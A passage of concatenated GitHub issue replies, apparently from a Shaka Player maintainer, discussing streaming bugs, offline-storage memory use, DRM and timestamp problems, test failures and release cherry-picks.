you try something a little bit different.  Even without autoplay, shaka.Player will stream and buffer data up to the buffering goal.  Try waiting to load videos 2, 3, and 4 until after the previous video is loaded:\njs\nplayer1.load(videoUrl1).then(function() {\n  return player2.load(videoUrl2);\n}).then(function() {\n  return player3.load(videoUrl3);\n}).then(function() {\n  return player4.load(videoUrl4);\n});\nThis may help the first video start more quickly.. @buggles333, have we answered your question?  Is there anything else we can do to help?. @danmo, what browser are you using and how are you checking memory consumption?\nI have run Chrome out of memory before by leaving the JavaScript console open.  When the network panel in the console is recording traffic, it will keep every media segment in memory (so the developer can scroll back and examine them).  It's an easy mistake to make.. I'm sorry.  We do our best, but we can't always triage and fix bugs in only a day or two.  We'll get to this as soon as we can.. Taking a look now. Here's what I did:\n\nOpen latest release (v2.2.8) and select \"Sintel 4k (MP4 only)\".  The MP4-only version is larger than the WebM version, so this should exacerbate any leak by fetching more data.\nOpen Chrome dev tools and select the \"Memory\" tab\nClick the \"take heap snapshot\" button (gray circle in the top-left of the panel)\nAfter the snapshot is done, click the \"Store\" button in the demo app\nDuring storage, take additional heap snapshots (10% progress, 20%, ... 90%)\nWait for storage to complete\nClick the \"take heap snapshot\" button again\n\nThe pre-storage snapshot in my case showed 8.8MB memory in use.  The post-storage snapshot showed the same.  On disk, the stored content is about 176MB.\nThe in-progress snapshots show increased memory usage during storage.  At 10% progress, this was about 26.3MB.  At 20% progress, this was about 42.7MB.  At 50% it was about 92.9MB.  At 90% it was about 147MB.  The bulk of this memory is used by the \"JSArrayBufferData\" type.\nDuring storage, we seem to be using a lot of memory.  After storage, the memory is freed.  So it does not appear to be an actual leak, but we could do better about freeing memory as we commit it to the database.. @vaage, FYI, since you are working on other storage-related issues.  I will try to tackle this for v2.2.x if possible.. Similar results from the latest nightly build.. Although this is not a leak, we are temporarily keeping all segment data in memory during the storage operation, which is pretty bad in its own right.\nIt will probably take me a few days to publish a fix, because I need to write a test to go along with it.  The test is the hard part by far.  The storage system is in the middle of a serious refactor, so a test is extra important right now.  We must be careful not to regress after fixing it.\nIn the mean time, you can apply this small change to your own deployment to fix the issue:\nIn lib/offline/download_manager.js, where you see this:\njs\n        this.storedSegments_.push(segment.segmentDb.key);\n        segment.segmentDb.data = response.data;\n        return this.storageEngine_.insertSegment(segment.segmentDb);\n      }.bind(this))\n      .then(function() {\n        if (!this.manifest_) {\n          return Promise.reject(new shaka.util.Error(\nAdd one line to the Promise chain after insertSegment() is complete:\n```js\n        this.storedSegments_.push(segment.segmentDb.key);\n        segment.segmentDb.data = response.data;\n        return this.storageEngine_.insertSegment(segment.segmentDb);\n      }.bind(this))\n      .then(function() {\n        // vvvvvvv\n        segment.segmentDb.data = null;   // <--- ADD THIS\n        // ^^^^^^^\n    if (!this.manifest_) {\n      return Promise.reject(new shaka.util.Error(\n\n```\nThis will relieve memory pressure during storage, and should unblock your launch.  We expect to have a more complete fix out early next week.. I have been unable to create a regression test for this, so we will publish a fix without one.\nHere are the things I explored in my attempts to write an automated test in JavaScript:\n\nWeakMap.  This doesn't help, because it only makes weak references to keys, not values, and the keys cannot be iterated, counted, or listed.  So we could keep weak references to ArrayBuffers in a test so that the test does not prevent garbage collection, but we would have no API to explore that map and see which buffers or how many buffers were still alive.\nperformance.memory.  This doesn't help because the actual data buffer in an ArrayBuffer does not seem to count toward the statistics there.  After allocating 30MB of ArrayBuffers in a test, the stats do not move.\nExploring object hierarchy.  This does not help, because DownloadManager does not actually hold the references to the ArrayBuffers directly.  Instead, the references are held by an array which is held by closures which are held by DownloadManager.  So there would be no way to iterate through private members of Storage and ultimately locate ArrayBuffer references.\n\nThe fix should be out today or Monday (pending code review internally), and it will be cherry-picked for the v2.2.9 release next week.. The fix has been cherry-picked for v2.2.9 and is available in the nightly build now: https://nightly-dot-shaka-player-demo.appspot.com/demo/\nPlease let us know if you have any questions.. Glad to hear it!  Please let us know if you need anything else.. Thanks for the PR!  The build bot likes it, I like it, so I'm merging it now.. This is causing failures in offline storage scenarios.  I'm going to try to fix it, but I may have to revert your PR.\nThe problem is that when close() is working correctly, not waiting for it to resolve can cause playback to fail.  The Widevine CDM won't let you open the same persistent session twice.\nEven when you wait for DrmEngine.destroy() to tell you you're done, the sessions haven't actually been closed yet, so subsequent playback using the same stored session fails (if you're fast enough).. I found a way to fix it.  Instead of trusting close() or ignoring it, we can trust it for 1 second, then ignore it if it doesn't resolve in that time.  This seems to work in my tests.. Should be fixed now.. @chrisfillmore, if you want to submit a PR to extend the timeline event behavior to emsg boxes, please do!. If your keys are usable, but it won't play through the encrypted part, it could be that the key IDs in your license do not match what is in your content.. I would suspect Exoplayer also to fail with a keyid mismatch.  If you get the same keyids on both platforms, then that's not the issue.\nAlso, the \"DecryptingAudioDecoder failed to init\" message is a good clue that it's not a problem with key IDs.\nCan you test the same manifest and license server in the current demo?  https://shaka-player-demo.appspot.com/demo/\nIf it plays in v2, then an upgrade should help.  We have an upgrade guide to help you with that process.\nIf it fails the same way in v2, then it's nothing to do with Shaka Player.  It could be a problem with the content itself, for example, if the hardware decoder can't decode but a software decoder can.  You may want to try disabling hardware decoding in chrome://flags and see if that affects the issue.. We have always been able to play encrypted content with a clear lead, or any other kind of partial encryption, for that matter.  We really don't do anything special for that.  The browser just handles it for us.. There is no action required from the application once a license is fetched.\nWere you able to play your content with the v2 demo?. Agreed.  If there are public APIs rejected with anything other than shaka.util.Error, that's a bug.  Otherwise, it's working as intended.. @dcharbonnier, have you found any void Promise rejections in our public APIs?  If not, I think this is all working as intended for now.. Okay.  We are working toward some general mechanisms for cancellation of Promise chains within the project, at which point Promise.reject() will likely go away.  We are only using it now for rejections that we know will be swallowed (such as on cancellation or destroy).. The fix has been cherry-picked for v2.2.9.. @mhosman, how was this resolved?. Okay.  I've put it back in queue to be reproduced by the team.  Thanks!. Not yet.  Sorry!\nAt any given time, there is one team member on duty to triage and reproduce issues, oldest first.  There are currently 6 items ahead of this one in queue.. This appears to be bad content.\nThe manifest has availabilityStartTime=\"1970-01-01T00:00:00Z\", which indicates that timestamp 0 in the media corresponds to January 1, 1970, UTC.\nAt unix timestamp 1513108176 (seconds since 1970, UTC), I fetched the manifest.  At that time, the first audio segment had timestamp 627266560 and timescale 48000.  Dividing 627266560 by 48000 yields 13068.05 seconds.\nThe first video segment had timestamp 326751 and timescale 25.  Dividing 326751 by 25 yields 13070.04.\nNeither the video nor audio segments are anywhere near the current unix timestamp.  So the availabilityStartTime attribute is not consistent with the media timestamps.\nI see a comment at the top of your manifest that says \"Created with Unified Streaming Platform(version=1.7.32)\".  I recommend you contact Unified Streaming to see if there are any updates.  It could be a bug which has already been fixed by them.  If not, you should ask them for further support to correct the manifest.\nI hope this helps!  Let us know if there's anything else we can do.. Cherry-picked to v2.3.1.. Cherry-picked for v2.2.10.. The cast receiver has been updated for v2.2.10 and v2.3.1.. It looks like sudo n stable now installs nodejs v9, but you had npm v5.5.1, which is incompatible with nodejs v9.\nWe'll see if we can write more universally-usable instructions for this.. Cherry-picked for v2.3.3.. @nicolasd, we will need to reproduce your issue before we can address it.  Can you please provide a manifest URI that we can try to play?  A copy of the manifest text is not enough, because it doesn't give us any way to access the media segments.. I think this feature is not working correctly. I will reopen and investigate.. The override set by the player after the initial manifest is parsed is wiped when a live manifest is updated.. No need, I'm already putting together the CL.. We will add a way for an app to specify a relative offset from the live edge when calling Player.load().  For example, playback starting at -10 in a live stream would be 10 seconds before the live edge.  This is in contrast to an absolute media timestamp (as we expect now).. This feature will be out in v2.4 this week.. @srampur, we run all tests nightly on all supported platforms & browsers, and additionally on Chrome Linux on every change before it is pushed.  We have not been able to reproduce this failure.\nI believe the default timeout is 2 minutes.  Are you able to reproduce the failure if you only run those specific tests?  For example, ./build/test.py --filter StreamingEngine.*gap.*middle ?\nWhile running tests, is your CPU maxed out?  How much CPU time is Chrome using during the test run?. It could be an issue with the virtual machine sharing time with the host CPU.  We do all of our testing on real hardware.\nIdeally, we would be able to make the tests robust and flexible enough to work on VMs, but I am not sure what the root of the timeout is.\nCan you try running tests with:\n./build/test.py --filter StreamingEngine.*gap.*middle --browsers Chrome --enable-logging=debug --runs 10\nThat might give us enough information to hazard a guess.. Here's what looks like the relevant bit from the logs:\n```\n[INFO] Running test (1 / 10)...\nChrome 63.0.3239 (Linux 0.0.0) INFO LOG: 'Using native EME as-is.'\nChrome 63.0.3239 (Linux 0.0.0) INFO LOG: 'Using native MSE as-is.'\nChrome 63.0.3239 (Linux 0.0.0) INFO LOG: 'Using native Promises.'\nChrome 63.0.3239 (Linux 0.0.0) INFO LOG: 'Using native VTTCue.'                                                                                                                                                                                                               \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'mvhd box is version 0.'                                                                                                                                                                                                                                             \nLOG LOG: 'init: completed initial Stream setup'                                                                                                                                                                                                                               \nLOG LOG: '(audio:3)', 'looking up segment:', 'presentationTime=0', 'currentPeriod.startTime=0'\nLOG LOG: 'tfdt box is version 0.'\nLOG LOG: '(video:2)', 'looking up segment:', 'presentationTime=0', 'currentPeriod.startTime=0'\nLOG LOG: 'tfdt box is version 0.'\nLOG LOG: '(video:2)', 'startup complete'\nLOG LOG: '(all) setting up Period 0'\nLOG LOG: '(all) Period 0 is being or has been set up'\nLOG LOG: '(all) Stream 3 is being or has been set up'\nLOG LOG: '(all) Stream 2 is being or has been set up'\nLOG LOG: '(all): seeked: buffered seek: playheadTime=8'\nLOG LOG: 'tfdt box is version 0.'\nLOG LOG: 'tfdt box is version 0.'\nLOG LOG: '(audio:3)', 'buffered to end of presentation'\nLOG LOG: '(video:2)', 'buffered to end of presentation'\nStreamingEngine\n    gap jumping\n      \u2717 jumps small gaps in the middle\n        Failed: Timeout waiting for time\n            at \n```\nAll 10 runs failed the same way, so it's not flaky.  Still, it doesn't behave the same way for us.\nI need to look into the details of the test and see what might have happened.\nFor now, I'm going to put it in v2.4 and assign it to myself.  I should be able to look into it in the first week of January.. Not at the moment.  But I may end up sending you a patch to get more information from the test logs once I narrow down the cause.. This has been bumped down my priority list, but I will try to get back to you soon.. In general, a VM may be a good way to expose performance-dependent tests that need to be deflaked and made more robust.  We see occasional test failures even on real hardware, but those are much more difficult to reproduce.\nI'm relabeling this as an enhancement to improve our tests by running them on a VM.. Looks good.  Thank!  Have you added yourself to CONTRIBUTORS & AUTHORS already?. Okay.  Thanks for your contribution!. @noedod, we do not have an ASUS Zenpad device to test with.  The error code you're quoting is generally a decoder error.  I expect this is a compatibility issue between your content and the hardware decoder on the device.\nI will consult with some colleagues to find out how we can verify this theory.  Since you have a Zenpad and we do not, would you be able to run some tests for us to diagnose the issue?. It appears that you can disable hardware decode in Chrome.  If you can do this for us on your Zenpad, it would help us confirm the theory that this is a hardware decoder issue:\n\nOpen Chrome on the Zenpad\nType \"chrome://flags\" into the URL bar\nIn the search field, type \"decode\"\nUnder \"Hardware-accelerated video decode\" click the \"Disable\" button\nClick the \"RELAUNCH NOW\" button\nTry playback in the Shaka Player demo again\n\nScreenshots of this process:\n\n\n. Checklist:\n - [x] Update FAQ\n - [x] Update architecture diagrams\n - [x] Update config tutorial to reflect new options in v2.3 and some v2.2.x updates\n - [x] Update change log for v2.3\n - [x] Write a new upgrade guide for v2.2 => v2.3\n - [x] Update offline tutorial WRT multiple downloads in parallel (#1047)\n - [x] Reread the plugin interfaces tutorial, update if needed\n - [x] Reread and execute the manifest parser tutorial, update if needed\n - [x] Update service worker tutorial with regard to best practices\n - [x] Update existing upgrade guides to target v2.3\n . I will update the comment in the existing tutorial to note that parallel downloads are possible, but I will defer fully updating the tutorial to demonstrate that (#1196).. A quick search of the code shows that this is not yet supported.  I've put it on the backlog for now, but we will consider this during our next planning phase in February.. The fix has been cherry-picked for v2.2.9.. Chrome does not support the video codec (\"avc1.100.42\") specified in the manifest.\n```js\nMediaSource.isTypeSupported('video/mp4; codecs=\"avc1.100.42,mp4a.40.2\"')\n => false\nMediaSource.isTypeSupported('video/mp4; codecs=\"avc1.100.42\"')\n => false\n```\nThe hls.js demo converts this string into \"avc1.64002a\".  It's not clear how this conversion is done, or why the player should do it.. Chrome has code for this conversion, but it is only enabled when the TS parser is enabled (which it isn't in standard Chrome builds).\nhttps://github.com/scheib/chromium/blob/b03fc92a51679a4a04645614879bc8e3a2955e77/media/base/video_codecs.cc#L356. Looks easy enough to add support for.  Shouldn't take long.. Sounds like a bug in the way we declared the class.  I expect it's TextDisplayer.destroy() that is the issue.  Let me do some testing and see if I can confirm that.. It appears to be the only external plugin class that implements shaka.util.IDestroyable, and we left out the declaration of destroy() in the externs.  This caused the compiler to rename the method inside the compiled library.. We are always happy to help.. The fix has been cherry-picked for v2.2.9.. I am also using Chrome 63 on Linux, but I do not see the same results as you.  For me, the subtitles are at the bottom, as they should be.  Are you seeing this consistently across machines and OSes?  Is it possible that you have some customized style sheet for cues installed in the browser?. Very strange.  We are using a native TextTrack as well, but instead of setting src='sub.vtt', we are using the addCue() API on the TextTrack.  It's not clear to me why it would display differently on your Linux machine than mine, with the same browser & version.\nDo you have any extensions installed which could be affecting it?  Do you get the same results in incognito mode?. @avelad, can you please share what the cause of the issue was?  I'm sure this could be useful to others in the future if they run into similar symptoms.. Interesting.  I would like to figure out what flag it is.  It could be a bug in some experimental thing in Chrome, or it could be a bug in Shaka Player that is only activated by some future-looking feature.. With \"experimental web platform features\" turned on, we get an implementation of VTTRegion.  This is the root cause of your issue.\nI don't yet know if it's VTTRegion itself which is broken or if we are using it incorrectly.. There are several things about our use of this upcoming region feature that are wrong.  We will push a quick fix for v2.3 that disables region-related functionality until it can be verified against this experimental implementation in Chrome.. Issues remaining for v2.4:\n  - TTML regions are specified in px\n  - VTT regions are in percentage of the video frame\n  - VTT regions are not being parsed yet\n  - Shaka Cue interface is in percentage\n  - VTTRegion web API is in percentage\n  - Our use of VTTRegion is out-of-date with regard to the spec and may be wrong in other ways\n  - None of this is well-tested\nTo support both VTT and TTML input, the Shaka Cue interface needs to be able to represent both px and percentage values.  The TextDisplayer needs to be able to render either.  SimpleTextDisplayer, which uses VTTCue and VTTRegion web APIs, should convert px to percentage to get the browser to render the region correctly.. We have removed our broken usage of VTTRegion so that the apps of today won't break on the Chrome of tomorrow.  This change will be in v2.2.9 and v2.3.0.  We will try to fix VTTRegion support in the default TextDisplayer for v2.4.. @avelad, although that looks odd, it's not clear to me if this is the expected result or not.  Can you please clarify?. Okay.  I'll reopen and we will take a look.  Thanks!. The region origin is \"10%, 10%\", and the extent is \"80%, 80%\", which is what the screenshot looks like: it starts close to the top-left corner (10% in) and takes up 80% of the width (stops 10% from the right).\n@avelad, why is this wrong?  What should it look like instead?. Height is not working as expected because we have to specify it to the browser in terms of lines.  See the VTTRegion interface, which is the only API for this available in the browser.  I filed https://github.com/google/shaka-player/issues/1290 to discuss ways to improve this, if possible.\nThe background is black because we aren't extracting the background style from TTML, not manipulating the CSS for the cue region.  I filed https://github.com/google/shaka-player/issues/1289 for style support.\nTranslation of TTML to VTTCue+VTTRegion is not perfect, and it likely never will be.  You may want to consider writing your own TextDisplayer plugin, which will allow you to render the cues yourself, rather than relying on the browser APIs for this.\nI filed those two new issues for further enhancements, so I will go ahead and close this issue again.  We have fixed what was originally broken in our previous VTTRegion code.  Thanks!. Ah, okay.  If you file a Chrome bug about that, please link to it on #1289 (cue style support).. This feature will be out in v2.4 this week.. Confirmed.  It should be easy to fix.. @universalarchi, we did not create every asset in our demo page.  Many of them were created by third parties.  There are headings in the asset list such as \"Shaka\", \"Axinom\", etc.  These tell you where the assets come from.  That particular one is under the \"GPAC\" heading, so it was published by GPAC.\nIn our sources, there is a file called demo/common/assets.js which contains the list of all demo assets and their metadata.  Included in that file are comments showing the page on which we originally found those assets.\nThe GPAC section begins like this:\njs\n  // GPAC assets {{{\n  // Src: https://gpac.wp.mines-telecom.fr/2012/02/23/dash-sequences/\n  // NOTE: The assets here using the \"live profile\" are not actually\n  // \"live streams\".  The content is still static, as is the timeline.\nThe source page https://gpac.wp.mines-telecom.fr/2012/02/23/dash-sequences/ does not say exactly what commands were used to create the content, but it does mention the tools that were used, and it links to this other page about generating content with MP4Box in general.\nFor further help with MP4Box and GPAC, please contact GPAC directly.\nTheir contact page is here: https://gpac.wp.imt.fr/home/about/support/\nTheir github issue page is here: https://github.com/gpac/gpac/issues\nDoes this help?. @vaage, you can use --disable-web-security in Chrome to work around CORS for the sake of debugging.. From the log posted by @vaage, it seems that the video and audio timestamps (as understood by our parser) are very different.  (26304s for video and 50044175s for audio)  Probably, our parser is doing something wrong.  We'll take a look.  Thanks!. In the video stream:\n - moov->mvhd has timescale of 1\n - moov->trak->mdia->mdhd has timescale of 25\nIn the audio stream:\n - moov->mvhd has timescale of 1\n - moov->trak->mdia->mdhd has timescale of 48000\nOur HLS parser makes a bad assumption that the timescale is 90000, which is only true for TS content.. I've been able to fix the parser locally with regard to timescale, but I still have an issue with your content.  It seems that the WebVTT segments have some bad timestamp info in them.\nFor example:\nWEBVTT\nX-TIMESTAMP-MAP=MPEGTS:8070850976,LOCAL:00:00:00.000\nTS timestamp of 8070850976 is 89676.12s, but the corresponding audio & video segments have timestamps of 93910850.6s.  For these to align, the MPEGTS timestamp in the vtt file would need to be \"8451976554000\".\nIf we take these apart in hex, it becomes apparent that the timestamp has rolled over at 33 bits:\n8070850976    => 0x  1e10f69a0\n8451976554000 => 0x7afe10f6610\nThe bottom 33 bits are very very close, and a quick google search shows that this seems to be a thing in MPEG that libraries have to deal with.\nWe'll fix the MP4 parsing first, then come back to the rollover issue.. No, I'm sorry.  Not yet.. I just pushed the first fix, which fixes assumptions about the timescale in MP4 HLS content.\nAfter that, we need to deal with rollover on load.\nAfter that, ideally, we should also deal with rollover which occurs during playback.  Given that this happens every 1.1 days in TS or HLS+VTT, end-users will definitely encounter this in live streams.. Yes, this will be in v2.3.1.  I hope to land rollover fixes in v2.3.1 as well.. All of the rollover-related fixes are now in.. Cherry-picked to v2.3.1.. Actually, I'm not certain, but it looks like a bug.  With the latest code, it does not start up well.\nIt seems to start playback at the start of the seek range instead of the end, which makes me think we have a bug.\nIf I seek to the middle of the seek range, it will eventually start playing.  It won't play within the last few minutes of the seek range, which makes me think the stream is also drifting a bit.\nI will investigate.  Thanks for the report, and the manifest link to reproduce it!. It's pretty difficult to diagnose content issues, especially with live streams.  It's not your fault.  I wish live streaming were simpler.. There are a few common patterns of things that go wrong with DASH streams, and I generally follow the same mechanical steps to diagnose content issues.  Usually, we find either an issue with availabilityStartTime or some drift.\nWe have considered building tools for this, but have never found the time.  Ironically, had we done it a year ago, the time savings would have paid for itself by now.. The \"wrong start time\" behavior can be reproduced with the DASH version of our live history stream, which is also suffering from drift.. The stream does recover in less than a minute, and on seek.  So it may not be a severe issue.  The UI is confusing, though, since it shows a large negative number until startup succeeds.. @boredom2, we haven't heard back from you in the past month, and we're unable to access the stream in your original report.  I'm going to close this issue now due to inactivity.  If/when you have time to look at this again and provide access to the stream, we would be happy to reopen the issue and investigate.  Thanks!. Some method on shaka.offline.Storage to call deleteDatabase through IStorageEngine.. Plus new tests.. I believe this was solved by c168ee86ad61ae856d4d71cee6264622c151db91, which came out in v2.3.2.  We now have Storage.deleteAll().. When mux.js 4.3.3 comes out, we will have an option to keep the original TS timestamps.\nHowever, there is also an issue with your content:\n```\nEXTM3U\nEXT-X-VERSION:4\nEXT-X-TARGETDURATION:5\nEXT-X-MEDIA-SEQUENCE:0\nEXT-X-PLAYLIST-TYPE:VOD\nEXTINF:4.098689,\nEXT-X-BYTERANGE:216012@0\n750k.ts\nEXTINF:4.000000,\nEXT-X-BYTERANGE:254552@216012\n750k.ts\nEXTINF:4.000000,\nEXT-X-BYTERANGE:236880@470564\n750k.ts\nEXTINF:0.000000,\nEXT-X-BYTERANGE:18424@707444\n750k.ts\nEXT-X-ENDLIST\n```\nThe last segment has a duration of 0, which is not valid.  Even with the fix to mux.js, your content will not play because of that.. Yes, and we will be updating to that shortly.. The updated mux.js does not seem to fix the negative DTS issue.  However, the rejection of segments with positive PTS with negative DTS is definitely a Chrome bug (http://crbug.com/398141).  It can be fixed by the Chrome experimental flag --enable-features=MseBufferByPts.  I will ask the Chrome team if the negative DTS allowance can be brought out from behind that flag.. The label \"bad content\" is for the 0-length segment at the end.\nThe label \"enhancement\" is for our update to mux.js 4.4 with the timestamp fix.\nThe label \"external\" is for the component related to Chrome's DTS bug.. The mux.js update is complete.  @thedracle, can you fix the 0-length segment in your content?. Excellent!  With the latest Shaka Player and the Chrome flag I mentioned before, the new clip is working.\nI will continue to follow-up with Chrome team on this issue.. mux.js v4.4.0 update cherry-picked to Shaka Player v2.3.1.. Doc updates cherry-picked for v2.3.4.. @chrisfillmore, I am intrigued, but not quite sure what some of this means.  Can you clarify a few points for me?\nIt sounds like this is a proposed plugin interface, to be implemented by an app developer.  The plugin would be consumed by Shaka Player to set up and demo a bug.  Is that correct?\njs\n  /**\n   * Invoked at application startup to perform a one-time action (e.g. user login),\n   * and subscribe to Player events.\n   * @param {shaka.Player} player\n   * @returns {Promise}\n   */\n  onStart (player) {},\nWould this be called by Player from the constructor?\njs\n  /**\n   * Called before Player#load, to allow the application to populate the AssetInfo,\n   * and configure the player.\n   * @param {shakaAssets.AssetInfo} asset\n   * @returns {Promise}\n   */\n  onBeforeLoad (asset) {},\nAssetInfo is only part of our demo app.  Would this plugin be part of the demo rather than the library interface?\njs\n  /**\n   * Player event names as keys, event listeners as values\n   * @type {Object<string,function>}\n   */\n  listeners: {}\n}\nWho consumes this dictionary, and what should they do with it?. I'm sorry I haven't had time to look at this in detail.  We will try to get to this once we get v2.4 out the door.  Thank you for your patience!. @chrisfillmore, I agree with you that supporting src= HLS will cause confusion among developers.  I predict bugs asking why the buffering or networking configs have no effect, at the very least.  Other things like seeking behavior will also differ.\n@sandersaares, I would also greatly prefer fps.2_0, but there is insufficient guidance from Apple on how to use it.  It would also be unusable on iOS due to the lack of MediaSource, so it would only apply to desktop Safari.\nThere has still been significant interest in a built-in fallback to src=, both for convenience of iOS/Fairplay support (#997 and #382) and for the convenience of plain MP4 playback (#816).  I am nervous about it, but we will try to put appropriate messaging in the JS console to make it clear that this is a convenience feature only, and that much of the player configuration will be ineffective in this mode.\nNone of this will preclude fps.2_0 support, if we can figure it out.  It would be preferred to fps.1_0 whenever possible.. This PR and the experimental branch it is based on are both driving toward fps.2_0.\nFor fps.1_0, the DRM stuff is clearly documented by Apple.  Before we can implement the FairPlay part, we need #997 (src= HLS), and that depends on #816 (src= mp4).  After #816, we will no longer assume MediaSource, and after #997, we will be using Apple's native HLS when necessary.  Then adding fps.1_0 is relatively easy.\nIf fps.2_0 can be solved, there are no other issues blocking its use.. No, I don't have any information on fps.2_0 licenses yet.\nThat castlabs link does not seem to say anything about either MSE or EME, just FairPlay DRM.  My understanding of the news is that iOS now has EME, but still does not have MSE.. In v2.2.5, we introduced a new method on Player called getManifest().  This should help you avoid a custom manifest parser.\nThe constructor of SegmentReference is exported, but the other public methods are not currently.  That is because we had expected the only use of SegmentReference in the application would be by custom manifest parsers.  Every method we export adds to the size of our compiled bundle, so we don't export more than we think we will need in the application.\nTo export the public methods and make them available outside the library, add the @export annotation.  See also this doc on exports: https://github.com/google/shaka-player/blob/master/docs/design/export.md\nWe would be happy to take a pull request for this if you have time.  Thanks!. I'm so sorry, I gave you bad information.  @export is for prototype methods, not for member variables on this.  I was thinking you needed to export prototype methods, not member variables.\nThere used to be @expose for member variables, but that is no longer supported by the compiler.\nLet me dig into this a bit and get back to you.. I think the best thing to do is to create exported getters for SegmentReference's fields.  Sorry I didn't realize this at the beginning!. Is that actually valid XML?  I am having a hard time finding any examples of scientific notation in xml durations.  I haven't dug into the spec yet.. XML durations seem to follow ISO 8601 duration format.  RFC 3339 has ABNF syntax of ISO 8601 durations in appendix A.  According to that, the seconds part is a string of digits, and does not allow for scientific notiation.. I'll have the build bot run tests on this, but it looks good to me.  Thanks!. Confirmed.  Looks like for the DASH live sim, it's a bug in our SegmentTemplate parser that is causing segment end times to be screwed up.. The bug was introduced in v2.2.9.  The fix, once published, will be cherry-picked for v2.2.10 and v2.3.1.. Cherry-picked for v2.3.1.. Cherry-picked for v2.2.10.. Multiple concurrent players and video elements is supported by the library, but may not be supported by every platform.  Many embedded devices exist which cannot support multiple video elements.\nWe've avoided singletons to make sure it is possible to have multiple players, and we explicitly support this in the library.\nWe could add tests to cover multiple concurrent playbacks.  I'm fairly sure the desktop browsers would support multiple playbacks, but those tests might fail on Chromecast or Tizen TVs, which would require us to disable those tests on specific platforms.\nIf you want to put together a set of multi-player playback tests, I'd be happy to review a PR for it.  I suggest you add another file, maybe test/multi_player_integration.js, since these tests will have a different setup from the other player tests and may need to be skipped on certain platforms.. This was a duplicate of #1204, and the fixes for #1204 were cherry-picked for v2.3.1 and v2.2.10.  Either of those releases should work for you.. Cherry-picked to v2.3.1.. Cherry-picked for v2.2.10.. Cherry-picked to v2.3.1. Cherry-picked for v2.2.10.. Cherry-picked to v2.3.1.. Cherry-picked to v2.3.1.. Cherry-picked to v2.3.1.. Fix cherry-picked for v2.3.4.. Okay, looks good!  Thank you for contributing!. Looks like this is breaking something in our demo app.  Load any custom, clear manifest URI, and it fails with DRM.NO_LICENSE_SERVER_GIVEN.  I'm looking into a fix.. We just fixed it in the demo app, by having the demo avoid filling the servers dictionary with empty strings.  It should be pushed to github shortly.. The fix is out now.  In future, we would like to write automated tests with WebDriver that make sure the demo app is working correctly.  For now, we're still doing manual QA on the demo itself.  It's lucky that I happened to use the demo this afternoon with a custom asset.  That might have gone unnoticed for some time.. Cherry-picked to v2.3.1.. Here's a quick repro link:  https://shaka-player-demo.appspot.com/demo/#asset=https://d1iicvyrac297k.cloudfront.net/01072018/001/BigBuckBunny_320x180.mpd;license=https://playready.ezdrm.com/cency/preauth.aspx?pX=E0183F;lang=en-US. We can reproduce the issue, but it does appear to be a decryption issue.  Shaka Player requests a license from the server using the information in the manifest, and the browser decrypts using the server-provided key.  So the decryption process and the decryption key are both out of our control.\nAre you sure the license server is providing the correct key for this content?  This is not something we can check ourselves.  Presumably, as the content owner, you should know the key and be able to confirm that the correct one is being delivered from the server.\nSince this doesn't seem to be a Shaka Player bug, I'm going to mark this as \"bad content\" for now, but we're still here to help you figure this out.  Please let us know what you find out from your end and from ezdrm.. Shaka Player does not support tile aggregation.  We just stream video to a video element using MediaSource.  If you want to stream 4 videos at once to 4 video elements, you can create 4 Shaka Player instances, but you will probably have issues keeping them synchronized.\nDoes that answer your question?. Glad to help!. Thanks, @chrisfillmore.  @avelad, did that answer your question?. The short version is: you can add this at the application level with one line after loading the Shaka library:\njs\nshaka.net.NetworkingEngine.registerScheme('file', shaka.net.HttpPlugin);\nWe aren't doing this in the library because file: URIs are not accessible from web pages in a browser.  @theodab will update the FAQ with this info.. Cherry-picked to v2.3.1.. Cherry-picked for v2.2.10.. I believe this is a duplicate of #1204, which we fixed on Dec 22.  The fix for #1204 is on the master branch and will be out in v2.3.1 in the very near future.\nCan you please try again with the latest code from the master branch?  I can't check for you, because you didn't provide a manifest URI.  Thanks!. Excellent, thanks!. TL;DR: Try player.seekRange() for the seekable range of media timestamps.\nWe don't ignore S@t.  We definitely parse and use it.  But we have two parts in our streaming model: the segment index, and the presentation timeline.  This is in keeping with the DASH spec.\nThe presentation timeline is defined by availabilityStartTime, the current time, and timeShiftBufferDepth.  This is why the seek range is what it is in Shaka Player.\nThe segment index is defined in this manifest by SegmentTimeline and S.  This is the manifest's map of what segments are available on the server, and their media timestamps.\nIt sounds like your segments do not align with the presentation timeline, which is a common issue in live DASH streams.  In some cases, the encoder/packager puts the wrong information in availabilityStartTime.  In others, it's an issue with the server's clock or with the client's clock synchronization config.\nAnd in some cases, it's \"drift\".  The segment index and the presentation timeline get further apart the longer the stream is running.  This is really really really common in DASH live streams.  So common that we intend to stop trusting availabilityStartTime and derive the live edge from the segment index instead.  This is a big change, though, so we haven't been able to work on it yet.  If you are interested, you can follow along on this work in issue #999.\nLooking at your manifest text, I see:\n```xml\n\n\n\n```\nAssuming publishTime is when you fetched the manifest, the stream had been running for 95,701,659 seconds.  The earliest media timestamp is 8,613,059,400,000 / 90,000 => 95,700,660, and the latest media timestamp is 8,613,149,310,000 / 90,000 => 95,701,659.  So I don't see any evidence of drift. \n (Assuming that publishTime is the time the request was made.  I can't confirm this without having access to a manifest URI.)\nIf you need to know the seekable range of media timestamps, we provide that in player.seekRange().  Have you tried that yet?  Does this answer your question?. @ondrejpar, if the \"real\" start date is not now - timeShiftBufferDepth, then it sounds like your timeShiftBufferDepth parameter is incorrect.  If 1 day's worth of content is not actually available on your server, then you need to correct your manifest.. Ah, I see.  Let me look again.  We may be making a mistake in seekRange().. @ondrejpar, can you please provide a manifest URI so that I can reproduce your issue exactly?. You can send manifest URIs to shaka-player-issues@google.com if you are not able to share them publicly.  Please reference this issue number if you do so.. Confirmed.  The seek range is 1 day, but there are only 3000 or so seconds of content in the manifest.. Yes, it's definitely a regression.  We will work on a fix.. Cherry-picked for v2.3.3.. I tried this in Chrome & Chrome beta, the latter using an experimental flag that changes MSE behavior with regard to timestamps.\nUnfortunately, I got the same results in both instances.  What surprised 